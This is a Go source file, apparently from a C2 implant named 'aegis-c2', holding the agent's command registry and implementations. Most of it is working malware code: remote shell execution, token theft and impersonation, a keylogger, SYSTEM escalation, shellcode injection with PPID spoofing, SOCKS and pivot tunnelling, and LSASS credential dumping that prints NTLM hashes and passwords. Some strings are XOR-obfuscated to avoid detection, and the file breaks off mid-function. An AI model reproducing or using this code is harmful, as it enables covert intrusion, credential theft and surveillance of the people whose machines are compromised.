package modules

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/aegis-c2/aegis/agent/health"
	"github.com/aegis-c2/aegis/agent/modmgr"
	"github.com/aegis-c2/aegis/agent/extexec"
	"github.com/aegis-c2/aegis/agent/loader"
	"github.com/aegis-c2/aegis/agent/job"
	"github.com/aegis-c2/aegis/agent/input"
	"github.com/aegis-c2/aegis/agent/lateral"
	"github.com/aegis-c2/aegis/agent/netenum"
	"github.com/aegis-c2/aegis/agent/pivot"
	"github.com/aegis-c2/aegis/agent/priv"
	"github.com/aegis-c2/aegis/agent/proxy"
	"github.com/aegis-c2/aegis/agent/shell"
	"github.com/aegis-c2/aegis/agent/token"
)

// ModuleFunc 是一个命令处理器的函数签名。
type ModuleFunc func(args string) (string, string, int)

// Registry 是所有已注册命令的映射。
var Registry = map[string]ModuleFunc{
	"shell":        ShellModule,
	"info":         InfoModule,
	"ls":           LsModule,
	"cat":          CatModule,
	"pwd":          PwdModule,
	"hostname":     HostnameModule,
	"whoami":       WhoamiModule,
	"ps":           PsModule,
	"upload":       UploadModule,
	"download":     DownloadModule,
	"download_dir": DownloadDirModule,
	"chmod":        ChmodModule,
	"mkdir":        MkdirModule,
	"rm":           RmModule,
	"mv":           MvModule,
	"cp":           CpModule,
	"chtimes":      ChtimesModule,
	"netstat":      NetstatModule,
	"services":     ServicesModule,
	"service_ctl":  ServiceControlModule,
	"reg_read":     RegReadModule,
	"reg_write":    RegWriteModule,
	"reg_delete":   RegDeleteModule,
	"reg_list":     RegListModule,
	"reg_create":   RegCreateKeyModule,
	"reg_delete_key": RegDeleteKeyModule,
	"reg_persist":  RegPersistModule,
	"env":          EnvModule,
	"env_set":      EnvSetModule,
	"env_unset":    EnvUnsetModule,
	"ifconfig":     IfconfigModule,
	"arp":          ARPModule,
	"mount":        MountModule,
	"screenshot":   ScreenshotModuleActual,
	"lsass":         LSASSModule,
	"memdump":      ProcDumpModuleActual,
	"kerb":         KerberosModule,
	"kill":         KillModule,
	"grep":         GrepModule,
	"find":         FindModule,
	"cd":           ChdirModule,
	"token_whoami": TokenWhoamiModule,
	"whois":        WhoisModule,
	"uuid":         UUIDModule,
	"limits":       LimitsModule,
	"priv_check":   PrivCheckModule,
	"getprivs":     GetPrivsModule,
	"forward":      ForwardModule,
	"weaponize":    WeaponizeModule,
	"bof":          BOFModule,
	"load":         InjectModule,
	"dotnet":       DotNetModule,
	"persist":      PersistModule,
	"socks":           SocksModule,
	"steal_token":     StealTokenModule,
	"rev2self":        Rev2SelfModule,
	"make_token":      MakeTokenModule,
	"impersonate":     ImpersonateModule,
	"record":          KeylogModule,
	"pivot":           PivotModule,
	"getsys":        GetSystemModule,
	"runas":         RunAsModule,
	"shell_interact":  ShellInteractModule,
	"job":             JobModule,
	"migrate":         MigrateModule,
	"sideload":        SideloadModule,
	"wmi_exec":        WMIExecModule,
	"remotecmd":       PsExecModule,
	"ssh_exec":        SSHExecModule,
	"mem_read":        MemoryReadModule,
	"mem_write":       MemoryWriteModule,
	"mem_scan":        MemoryScanModule,
	"mem_query":       MemoryQueryModule,
	"dll_inject":      DLLInjectModule,
	"dll_spawn":       DLLSpawnModule,
	"net":             NetEnumModule,
	"sam_dump":        SAMDumpModule,
	"extension":      ExtensionModule,
	"reconfig":       ReconfigModule,
	"watch":          WatcherModule,
}

// ShellModule 执行 shell 命令。
func ShellModule(args string) (string, string, int) {
	if args == "" {
		return "", "empty command", 1
	}

	timeout := 30
	// 解析超时: "cmd /C ping 127.0.0.1 -t" 或 "30|cmd /C ..."
	cmdStr := args
	if idx := strings.Index(args, "|"); idx > 0 {
		fmt.Sscanf(args[:idx], "%d", &timeout)
		cmdStr = args[idx+1:]
	}

	ctx := context.Background()
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
		defer cancel()
	}

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	} else {
		c = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}

	var outBuf, errBuf bytes.Buffer
	c.Stdout = &outBuf
	c.Stderr = &errBuf

	err := c.Run()
	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}
	return outBuf.String(), errBuf.String(), exitCode
}

// InfoModule 收集系统信息。
func InfoModule(args string) (string, string, int) {
	var info strings.Builder
	hostname, _ := os.Hostname()
	info.WriteString(fmt.Sprintf("Hostname:  %s\n", hostname))
	info.WriteString(fmt.Sprintf("OS:        %s\n", runtime.GOOS))
	info.WriteString(fmt.Sprintf("Arch:      %s\n", runtime.GOARCH))
	info.WriteString(fmt.Sprintf("CPUs:      %d\n", runtime.NumCPU()))

	cwd, _ := os.Getwd()
	info.WriteString(fmt.Sprintf("CWD:       %s\n", cwd))

	info.WriteString(fmt.Sprintf("PID:       %d\n", os.Getpid()))

	u, err := os.UserHomeDir()
	if err == nil {
		info.WriteString(fmt.Sprintf("Home:      %s\n", u))
	}

	return info.String(), "", 0
}

// LsModule 列出目录内容。
func LsModule(args string) (string, string, int) {
	if args == "" {
		args = "."
	}
	entries, err := os.ReadDir(args)
	if err != nil {
		return "", err.Error(), 1
	}

	var sb strings.Builder
	for _, e := range entries {
		info, _ := e.Info()
		perm := info.Mode().Perm().String()
		size := info.Size()
		name := e.Name()
		if e.IsDir() {
			name += "/"
		}
		sb.WriteString(fmt.Sprintf("%s %10d %s\n", perm, size, name))
	}
	return sb.String(), "", 0
}

// CatModule 读取文件内容。
func CatModule(args string) (string, string, int) {
	if args == "" {
		return "", "no file path specified", 1
	}
	data, err := os.ReadFile(args)
	if err != nil {
		return "", err.Error(), 1
	}
	return string(data), "", 0
}

// PwdModule 返回当前工作目录。
func PwdModule(args string) (string, string, int) {
	cwd, err := os.Getwd()
	if err != nil {
		return "", err.Error(), 1
	}
	return cwd, "", 0
}

// HostnameModule 返回主机名。
func HostnameModule(args string) (string, string, int) {
	h, err := os.Hostname()
	if err != nil {
		return "", err.Error(), 1
	}
	return h, "", 0
}

// WhoamiModule 返回当前用户名。
func WhoamiModule(args string) (string, string, int) {
	u, err := user.Current()
	if err != nil {
		return "", err.Error(), 1
	}
	return u.Username, "", 0
}

// PsModule is implemented in process.go / process_windows.go (native).

// socksServer is the global SOCKS5 server instance.
var socksServer = proxy.NewSOCKS5Server()

// SocksModule handles SOCKS proxy commands.
// Usage:
//
//	socks connect <target> <port>  — create a new SOCKS session
//	socks close <session_id>       — close a session
//	socks send <session_id> <b64>  — send base64-encoded data to session
//	socks read <session_id>        — read data from session (blocks briefly)
//	socks list                     — list all active sessions
func SocksModule(args string) (string, string, int) {
	parts := strings.SplitN(args, " ", 2)
	if len(parts) < 1 {
		return "", "usage: socks <connect|close|send|read|list> [args...]", 1
	}

	subCmd := parts[0]
	subArgs := ""
	if len(parts) > 1 {
		subArgs = parts[1]
	}

	switch subCmd {
	case "connect":
		// Format: "session_id target port"
		fields := strings.Fields(subArgs)
		if len(fields) < 3 {
			return "", "usage: socks connect <session_id> <target> <port>", 1
		}
		sid, target, portStr := fields[0], fields[1], fields[2]
		var port int
		if _, err := fmt.Sscanf(portStr, "%d", &port); err != nil {
			return "", fmt.Sprintf("invalid port: %s", portStr), 1
		}
		sess, err := socksServer.NewSession(sid, target, port)
		if err != nil {
			return "", fmt.Sprintf("connect %s:%d: %v", target, port, err), 1
		}
		return fmt.Sprintf("session %s connected to %s:%d", sess.ID, target, port), "", 0

	case "close":
		sid := strings.TrimSpace(subArgs)
		if sid == "" {
			return "", "usage: socks close <session_id>", 1
		}
		socksServer.CloseSession(sid)
		return fmt.Sprintf("session %s closed", sid), "", 0

	case "send":
		// Format: "session_id base64data"
		fields := strings.Fields(subArgs)
		if len(fields) < 2 {
			return "", "usage: socks send <session_id> <base64_data>", 1
		}
		sid, b64data := fields[0], fields[1]
		data, err := base64.StdEncoding.DecodeString(b64data)
		if err != nil {
			return "", fmt.Sprintf("base64 decode: %v", err), 1
		}
		n, err := socksServer.SendData(sid, data)
		if err != nil {
			return "", fmt.Sprintf("send: %v", err), 1
		}
		return fmt.Sprintf("sent %d bytes to session %s", n, sid), "", 0

	case "read":
		sid := strings.TrimSpace(subArgs)
		if sid == "" {
			return "", "usage: socks read <session_id>", 1
		}
		buf := make([]byte, 65536)
		n, err := socksServer.ReadData(sid, buf)
		if err != nil {
			return "", fmt.Sprintf("read: %v", err), 1
		}
		return base64.StdEncoding.EncodeToString(buf[:n]), "", 0

	case "list":
		sessions := socksServer.ListSessions()
		if len(sessions) == 0 {
			return "no active SOCKS sessions", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-12s %-30s %s\n", "ID", "TARGET", "PORT"))
		sb.WriteString(strings.Repeat("-", 50) + "\n")
		for _, s := range sessions {
			sb.WriteString(fmt.Sprintf("%-12s %-30s %d\n", s.ID, s.Target, s.Port))
		}
		return sb.String(), "", 0

	default:
		return fmt.Sprintf("unknown socks subcommand: %s", subCmd), "", 1
	}
}

// GetSOCKSServer returns the global SOCKS5 server for server-side data relay.
func GetSOCKSServer() *proxy.SOCKS5Server {
	return socksServer
}

// SocksSessionJSON is used for JSON serialization of SOCKS sessions.
type SocksSessionJSON struct {
	ID     string `json:"id"`
	Target string `json:"target"`
	Port   int    `json:"port"`
	Closed bool   `json:"closed"`
}

// ListSOCKSSessions returns all active sessions as JSON.
func ListSOCKSSessions() ([]byte, error) {
	sessions := socksServer.ListSessions()
	out := make([]SocksSessionJSON, len(sessions))
	for i, s := range sessions {
		out[i] = SocksSessionJSON{
			ID:     s.ID,
			Target: s.Target,
			Port:   s.Port,
			Closed: s.IsClosed(),
		}
	}
	return json.Marshal(out)
}

// StealTokenModule 复制目标进程 Token 并模拟。
func StealTokenModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: steal_token <pid>", 1
	}
	var pid uint32
	if _, err := fmt.Sscanf(args, "%d", &pid); err != nil {
		return "", fmt.Sprintf("invalid pid: %s", args), 1
	}
	if err := token.StealToken(pid); err != nil {
		return "", err.Error(), 1
	}
	info, _ := token.TokenInfo()
	return fmt.Sprintf("successfully stolen token (pid=%d)\n%s", pid, info), "", 0
}

// Rev2SelfModule 恢复为原始 Token。
func Rev2SelfModule(args string) (string, string, int) {
	if err := token.RevToSelf(); err != nil {
		return "", err.Error(), 1
	}
	return "reverted to original token", "", 0
}

// MakeTokenModule 使用指定凭据创建登录会话并模拟。
func MakeTokenModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: make_token <domain> <username> <password>", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 3 {
		return "", "usage: make_token <domain> <username> <password>", 1
	}
	domain, username, password := fields[0], fields[1], fields[2]
	if err := token.MakeToken(domain, username, password); err != nil {
		return "", err.Error(), 1
	}
	return fmt.Sprintf("successfully created token for %s\\%s", domain, username), "", 0
}

// ImpersonateModule 模拟指定用户的 Token。
func ImpersonateModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: impersonate <username>", 1
	}
	username := strings.TrimSpace(args)
	if err := token.ImpersonateUser(username); err != nil {
		return "", err.Error(), 1
	}
	info, _ := token.TokenInfo()
	return fmt.Sprintf("successfully impersonating %s\n%s", username, info), "", 0
}

// input instance
var kl = input.NewInputMonitor()

// KeylogModule 处理键盘记录器命令。
func KeylogModule(args string) (string, string, int) {
	fields := strings.Fields(args)
	if len(fields) == 0 {
		return "", "usage: keylog <start|stop|dump|clear|status>", 1
	}

	switch fields[0] {
	case "start":
		if err := kl.Start(); err != nil {
			return "", err.Error(), 1
		}
		return "keylogger started", "", 0
	case "stop":
		kl.Stop()
		return "keylogger stopped", "", 0
	case "dump":
		data := kl.Dump()
		if data == "" {
			return "no keystrokes recorded", "", 0
		}
		return data, "", 0
	case "clear":
		kl.Clear()
		return "keystroke buffer cleared", "", 0
	case "status":
		if kl.IsRunning() {
			return "keylogger is running", "", 0
		}
		return "keylogger is stopped", "", 0
	default:
		return fmt.Sprintf("unknown keylog subcommand: %s", fields[0]), "", 1
	}
}

var pivotListeners = make(map[string]*pivot.Listener)
var pivotListenersMu sync.Mutex // guards pivotListeners map

// pivotGet returns a listener by ID (caller must hold lock or be single-threaded).
func pivotGet(id string) (*pivot.Listener, bool) {
	l, ok := pivotListeners[id]
	return l, ok
}

// PivotModule 处理 Pivot 监听器命令。
// Usage:
//
//	pivot create tcp <bind_addr>
//	pivot start <listener_id>
//	pivot stop <listener_id>
//	pivot list
//	pivot sessions <listener_id>
//	pivot close <listener_id> <session_id>
//	pivot send <listener_id> <session_id> <b64_data>
func PivotModule(args string) (string, string, int) {
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "", "usage: pivot <create|start|stop|list|sessions|close|send> [args...]", 1
	}

	switch fields[0] {
	case "create":
		if len(fields) < 4 {
			return "", "usage: pivot create <tcp|named_pipe> <bind_addr>", 1
		}
		pivotType, bindAddr := fields[1], fields[2]
		var l *pivot.Listener
		switch pivotType {
		case "tcp":
			l = pivot.NewTCPListener(bindAddr, nil)
		default:
			return "", fmt.Sprintf("unsupported pivot type: %s", pivotType), 1
		}
		pivotListenersMu.Lock()
		pivotListeners[l.ID] = l
		pivotListenersMu.Unlock()
		return fmt.Sprintf("pivot listener created: id=%s type=%s bind=%s", l.ID, pivotType, bindAddr), "", 0

	case "start":
		if len(fields) < 2 {
			return "", "usage: pivot start <listener_id>", 1
		}
		lid := fields[1]
		pivotListenersMu.Lock()
		l, ok := pivotListeners[lid]
		pivotListenersMu.Unlock()
		if !ok {
			return "", fmt.Sprintf("listener not found: %s", lid), 1
		}
		if err := l.Start(); err != nil {
			return "", fmt.Sprintf("start failed: %v", err), 1
		}
		return fmt.Sprintf("pivot listener %s started on %s", lid, l.BindAddr), "", 0

	case "stop":
		if len(fields) < 2 {
			return "", "usage: pivot stop <listener_id>", 1
		}
		lid := fields[1]
		pivotListenersMu.Lock()
		l, ok := pivotListeners[lid]
		pivotListenersMu.Unlock()
		if !ok {
			return "", fmt.Sprintf("listener not found: %s", lid), 1
		}
		l.Stop()
		return fmt.Sprintf("pivot listener %s stopped", lid), "", 0

	case "list":
		pivotListenersMu.Lock()
		count := len(pivotListeners)
		// Snapshot listener data while holding the lock
		type entry struct {
			id, pType, bindAddr string
			running             bool
		}
		entries := make([]entry, 0, count)
		for id, l := range pivotListeners {
			entries = append(entries, entry{id, l.Type, l.BindAddr, l.Running})
		}
		pivotListenersMu.Unlock()

		if count == 0 {
			return "no pivot listeners", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-12s %-10s %-30s %s\n", "ID", "TYPE", "BIND_ADDR", "STATUS"))
		sb.WriteString(strings.Repeat("-", 70) + "\n")
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("%-12s %-10s %-30s %v\n", e.id, e.pType, e.bindAddr, e.running))
		}
		return sb.String(), "", 0

	case "sessions":
		if len(fields) < 2 {
			return "", "usage: pivot sessions <listener_id>", 1
		}
		lid := fields[1]
		pivotListenersMu.Lock()
		l, ok := pivotListeners[lid]
		pivotListenersMu.Unlock()
		if !ok {
			return "", fmt.Sprintf("listener not found: %s", lid), 1
		}
		sessions := l.ListSessions()
		if len(sessions) == 0 {
			return "no active pivot sessions", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-12s %-30s %s\n", "ID", "ADDR", "STATUS"))
		sb.WriteString(strings.Repeat("-", 55) + "\n")
		for _, s := range sessions {
			status := "open"
			if s.Closed {
				status = "closed"
			}
			sb.WriteString(fmt.Sprintf("%-12s %-30s %s\n", s.ID, s.Addr, status))
		}
		return sb.String(), "", 0

	case "close":
		if len(fields) < 3 {
			return "", "usage: pivot close <listener_id> <session_id>", 1
		}
		lid, sid := fields[1], fields[2]
		pivotListenersMu.Lock()
		l, ok := pivotListeners[lid]
		pivotListenersMu.Unlock()
		if !ok {
			return "", fmt.Sprintf("listener not found: %s", lid), 1
		}
		l.CloseSession(sid)
		return fmt.Sprintf("pivot session %s closed", sid), "", 0

	case "send":
		if len(fields) < 4 {
			return "", "usage: pivot send <listener_id> <session_id> <base64_data>", 1
		}
		lid, sid, b64data := fields[1], fields[2], fields[3]
		pivotListenersMu.Lock()
		l, ok := pivotListeners[lid]
		pivotListenersMu.Unlock()
		if !ok {
			return "", fmt.Sprintf("listener not found: %s", lid), 1
		}
		data, err := base64.StdEncoding.DecodeString(b64data)
		if err != nil {
			return "", fmt.Sprintf("base64 decode: %v", err), 1
		}
		err = l.SendData(sid, data)
		if err != nil {
			return "", fmt.Sprintf("send: %v", err), 1
		}
		return fmt.Sprintf("sent %d bytes to pivot session %s", len(data), sid), "", 0

	default:
		return fmt.Sprintf("unknown pivot subcommand: %s", fields[0]), "", 1
	}
}

// ShellInteractModule 管理交互式 shell 会话。
// Usage:
//
//	shell_interact start [shell]  — 创建新 shell（可选指定路径）
//	shell_interact write <id> <b64_data> — 写入 stdin
//	shell_interact read <id> [max_bytes] — 读取 stdout
//	shell_interact close <id>   — 终止 shell
//	shell_interact list          — 列出所有 shell
func ShellInteractModule(args string) (string, string, int) {
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "", "usage: shell_interact <start|write|read|close|list> [args...]", 1
	}

	mgr := shell.DefaultManager

	switch fields[0] {
	case "start":
		shellPath := ""
		if len(fields) > 1 {
			shellPath = fields[1]
		}
		sid, err := mgr.Start(shellPath)
		if err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("shell started: id=%s", sid), "", 0

	case "write":
		if len(fields) < 3 {
			return "", "usage: shell_interact write <session_id> <base64_data>", 1
		}
		sid, b64data := fields[1], fields[2]
		data, err := base64.StdEncoding.DecodeString(b64data)
		if err != nil {
			return "", fmt.Sprintf("base64 decode: %v", err), 1
		}
		n, err := mgr.Write(sid, data)
		if err != nil {
			return "", fmt.Sprintf("write: %v", err), 1
		}
		return fmt.Sprintf("wrote %d bytes to shell %s", n, sid), "", 0

	case "read":
		if len(fields) < 2 {
			return "", "usage: shell_interact read <session_id> [max_bytes]", 1
		}
		sid := fields[1]
		maxBytes := 4096
		if len(fields) > 2 {
			fmt.Sscanf(fields[2], "%d", &maxBytes)
		}
		data, err := mgr.Read(sid, maxBytes)
		if err != nil {
			return "", fmt.Sprintf("read: %v", err), 1
		}
		return base64.StdEncoding.EncodeToString(data), "", 0

	case "close":
		if len(fields) < 2 {
			return "", "usage: shell_interact close <session_id>", 1
		}
		if err := mgr.Close(fields[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("shell %s closed", fields[1]), "", 0

	case "list":
		ids := mgr.List()
		if len(ids) == 0 {
			return "no active shell sessions", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-12s\n", "ID"))
		sb.WriteString(strings.Repeat("-", 15) + "\n")
		for _, id := range ids {
			sb.WriteString(fmt.Sprintf("%-12s\n", id))
		}
		return sb.String(), "", 0

	default:
		return fmt.Sprintf("unknown subcommand: %s", fields[0]), "", 1
	}
}

// JobModule 管理后台任务。
// Usage:
//
//	job start <type> <args_json>   — 启动后台任务
//	job stop <job_id>              — 停止任务
//	job kill <job_id>              — 强制终止
//	job list                       — 列出所有任务
func JobModule(args string) (string, string, int) {
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "", "usage: job <start|stop|kill|list> [args...]", 1
	}

	mgr := job.DefaultManager

	switch fields[0] {
	case "start":
		if len(fields) < 3 {
			return "", "usage: job start <type> <args_json>", 1
		}
		jobType := fields[1]
		argsJSON := fields[2]

		var jobArgs map[string]string
		if err := json.Unmarshal([]byte(argsJSON), &jobArgs); err != nil {
			return "", fmt.Sprintf("invalid args json: %v", err), 1
		}

		jid, err := mgr.Start(jobType, jobArgs)
		if err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("job started: id=%s type=%s", jid, jobType), "", 0

	case "stop":
		if len(fields) < 2 {
			return "", "usage: job stop <job_id>", 1
		}
		if err := mgr.Stop(fields[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("job %s stopped", fields[1]), "", 0

	case "kill":
		if len(fields) < 2 {
			return "", "usage: job kill <job_id>", 1
		}
		if err := mgr.Kill(fields[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("job %s killed", fields[1]), "", 0

	case "list":
		jobs := mgr.List()
		if len(jobs) == 0 {
			return "no active jobs", "", 0
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-12s %-20s %s\n", "ID", "TYPE", "STATUS"))
		sb.WriteString(strings.Repeat("-", 50) + "\n")
		for _, j := range jobs {
			sb.WriteString(fmt.Sprintf("%-12s %-20s %s\n", j.ID, j.Type, j.Status))
		}
		return sb.String(), "", 0

	default:
		return fmt.Sprintf("unknown subcommand: %s", fields[0]), "", 1
	}
}

// GetSystemModule 提权到 SYSTEM。
// Usage: getsystem
func GetSystemModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "getsystem is only available on Windows", 1
	}
	err := priv.GetSys()
	if err != nil {
		return "", err.Error(), 1
	}
	il := priv.IntegrityLevel()
	return fmt.Sprintf("successfully elevated to SYSTEM (integrity: %s)", il), "", 0
}

// RunAsModule 使用指定凭据创建新进程。
// Usage: runas <domain> <username> <password> <command>
func RunAsModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "runas is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 4 {
		return "", "usage: runas <domain> <username> <password> <command>", 1
	}
	domain, username, password := fields[0], fields[1], fields[2]
	command := strings.Join(fields[3:], " ")
	err := priv.RunAs(domain, username, password, command)
	if err != nil {
		return "", err.Error(), 1
	}
	return fmt.Sprintf("process created as %s\\%s: %s", domain, username, command), "", 0
}

// MigrateModule 注入 shellcode 到目标进程实现迁移。
// Server 端生成与当前 agent 同配置的 shellcode 并通过 base64 传输。
// Usage: migrate <pid> <base64_shellcode>
func MigrateModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "migrate is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 2 {
		return "", "usage: migrate <pid> <base64_shellcode>", 1
	}
	var pid int
	if _, err := fmt.Sscanf(fields[0], "%d", &pid); err != nil {
		return "", fmt.Sprintf("invalid pid: %s", fields[0]), 1
	}
	shellcode, err := base64.StdEncoding.DecodeString(fields[1])
	if err != nil {
		return "", fmt.Sprintf("base64 decode: %v", err), 1
	}

	result := loader.Load(&loader.LoadConfig{
		PID:       pid,
		Shellcode: shellcode,
	})
	if !result.Success {
		return "", result.Message, 1
	}
	return fmt.Sprintf("migrate successful: injected into pid=%d", pid), "", 0
}

// SideloadModule 以 PPID 欺骗方式创建进程并注入 shellcode。
// Usage: sideload <process_name> <ppid> <base64_shellcode> [args...]
// ppid=0 表示不使用 PPID 欺骗
func SideloadModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "sideload is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 3 {
		return "", "usage: sideload <process_name> <ppid> <base64_shellcode> [args...]", 1
	}
	processName := fields[0]
	var ppid int
	if _, err := fmt.Sscanf(fields[1], "%d", &ppid); err != nil {
		return "", fmt.Sprintf("invalid ppid: %s", fields[1]), 1
	}
	shellcode, err := base64.StdEncoding.DecodeString(fields[2])
	if err != nil {
		return "", fmt.Sprintf("base64 decode: %v", err), 1
	}
	var procArgs []string
	if len(fields) > 3 {
		procArgs = fields[3:]
	}

	result := loader.LoadWithSpawn(&loader.SpawnConfig{
		ProcessName: processName,
		ProcessArgs: procArgs,
		PPID:        ppid,
		Shellcode:   shellcode,
	})
	if !result.Success {
		return "", result.Message, 1
	}
	return fmt.Sprintf("sideload successful: injected into %s (ppid=%d)", processName, ppid), "", 0
}

// xorKey used to decode embedded string constants at runtime.
const xorKey = 0x5A

// xorDecode decodes a byte slice in-place and returns the string.
func xorDecode(b []byte) string {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ xorKey
	}
	return string(out)
}

// Credential module string constants (XOR-obfuscated at rest).
var (
	strExtractedBOF    = []byte{0x1f, 0x22, 0x2e, 0x28, 0x3b, 0x39, 0x2e, 0x3f, 0x3e, 0x7a, 0x7f, 0x3e, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x28, 0x35, 0x37, 0x7a, 0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x72, 0x18, 0x15, 0x1c, 0x73, 0x60, 0x50, 0x50}
	strBOFFallback     = []byte{0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x76, 0x7a, 0x3c, 0x3b, 0x36, 0x36, 0x33, 0x34, 0x3d, 0x7a, 0x38, 0x3b, 0x39, 0x31, 0x7a, 0x2e, 0x35, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x60, 0x50, 0x50}
	strExtractedAlt    = []byte{0x1f, 0x22, 0x2e, 0x28, 0x3b, 0x39, 0x2e, 0x3f, 0x3e, 0x7a, 0x7f, 0x3e, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x28, 0x35, 0x37, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x60, 0x50, 0x50}
	strBOFFailNoCreds  = []byte{0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x7a, 0x3b, 0x34, 0x3e, 0x7a, 0x34, 0x35, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x35, 0x2f, 0x34, 0x3e, 0x7a, 0x33, 0x34, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29}
	strBOFFailFallback = []byte{0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x18, 0x15, 0x1c, 0x7a, 0x3c, 0x3b, 0x33, 0x36, 0x3f, 0x3e, 0x60, 0x7a, 0x7f, 0x29, 0x7a, 0x72, 0x2f, 0x29, 0x3f, 0x7a, 0x77, 0x77, 0x3c, 0x3b, 0x36, 0x36, 0x38, 0x3b, 0x39, 0x31, 0x7a, 0x3c, 0x35, 0x28, 0x7a, 0x3b, 0x36, 0x2e, 0x3f, 0x28, 0x34, 0x3b, 0x2e, 0x33, 0x2c, 0x3f, 0x7a, 0x29, 0x35, 0x2f, 0x28, 0x39, 0x3f, 0x29, 0x73}
	strNoCredsLSASS    = []byte{0x34, 0x35, 0x7a, 0x39, 0x28, 0x3f, 0x3e, 0x3f, 0x34, 0x2e, 0x33, 0x3b, 0x36, 0x29, 0x7a, 0x3c, 0x35, 0x2f, 0x34, 0x3e, 0x7a, 0x33, 0x34, 0x7a, 0x16, 0x09, 0x1b, 0x09, 0x09, 0x7a, 0x72, 0x18, 0x15, 0x1c, 0x73}
)
// LSASSModule 通过 BOF 模块从 LSASS 内存提取凭据。
// 运行时加载 COFF 对象，执行后内存清零。
// 可选回退到降维数据源（credmgr/dpapi/browser/registry）。
// Usage: lsass [--fallback]
func LSASSModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "credential extraction is only available on Windows", 1
	}

	// 首选：BOF 模块（运行时加载，执行后清零）
	result, err := health.ExtractFromLSASS()
	if err == nil && len(result.Credentials) > 0 {
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf(xorDecode(strExtractedBOF), len(result.Credentials)))
		for _, cred := range result.Credentials {
			sb.WriteString(fmt.Sprintf("  Username:    %s\n", cred.Username))
			if cred.Domain != "" {
				sb.WriteString(fmt.Sprintf("  Domain:      %s\n", cred.Domain))
			}
			if cred.NTLMHash != "" {
				sb.WriteString(fmt.Sprintf("  NTLM Hash:   %s\n", cred.NTLMHash))
			}
			if cred.LMHash != "" {
				sb.WriteString(fmt.Sprintf("  LM Hash:     %s\n", cred.LMHash))
			}
			if cred.Password != "" {
				sb.WriteString(fmt.Sprintf("  Password:    %s\n", cred.Password))
			}
			sb.WriteString(fmt.Sprintf("  Source:      %s\n\n", cred.SourceType))
		}
		return sb.String(), "", 0
	}

	// 回退：降维数据源（不碰 LSASS）
	if strings.Contains(args, "--fallback") || strings.Contains(args, "--alt") {
		altResult := health.ExtractAlternative()
		if len(altResult.Credentials) > 0 {
			var sb strings.Builder
			sb.WriteString(xorDecode(strBOFFallback) + "\n")
			sb.WriteString(fmt.Sprintf(xorDecode(strExtractedAlt), len(altResult.Credentials)))
			for _, cred := range altResult.Credentials {
				sb.WriteString(fmt.Sprintf("  Username:    %s\n", cred.Username))
				if cred.Domain != "" {
					sb.WriteString(fmt.Sprintf("  Domain:      %s\n", cred.Domain))
				}
				if cred.NTLMHash != "" {
					sb.WriteString(fmt.Sprintf("  NTLM Hash:   %s\n", cred.NTLMHash))
				}
				if cred.LMHash != "" {
